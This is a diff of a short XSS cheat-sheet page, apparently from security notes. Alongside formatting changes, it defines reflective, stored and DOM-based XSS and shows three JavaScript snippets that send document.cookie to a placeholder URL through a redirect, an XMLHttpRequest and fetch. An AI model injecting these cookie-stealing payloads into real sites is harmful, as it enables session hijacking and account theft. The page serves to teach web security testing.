@@ -1,17 +1,12 @@
----
-id: xss
-title: XSS
----
+# 💬 XSS
 
-# XSS
-
-XSS (Cross Site Scripting) is a type of attack in which malicious scripts are injected in a website and executed on the client browser.
+Cross Site Scripting (XSS) is a type of attack in which malicious scripts are injected in a website and executed on the client browser.
 
 There are three types of XSS:
 
--   reflective
--   stored
--   DOM-based.
+- reflective
+- stored
+- DOM-based.
 
 ## Send requests in Javascript
 
@@ -20,17 +15,17 @@ These snippets below are possible ways to do it.
 
 ```js
 // this is a redirection, but it could be used too
-document.location = "<url>?cookie=" + document.cookie;
+document.location = '<url>?cookie=' + document.cookie
 ```
 
 ```js
-var request = new XMLHttpRequest();
-request.open("GET", "<url>?cookie=" + document.cookie);
-request.send(null);
+var request = new XMLHttpRequest()
+request.open('GET', '<url>?cookie=' + document.cookie)
+request.send(null)
 ```
 
 ```js
-fetch("<url>?cookie=" + document.cookie);
+fetch('<url>?cookie=' + document.cookie)
 ```
 
 ## CSP bypasses
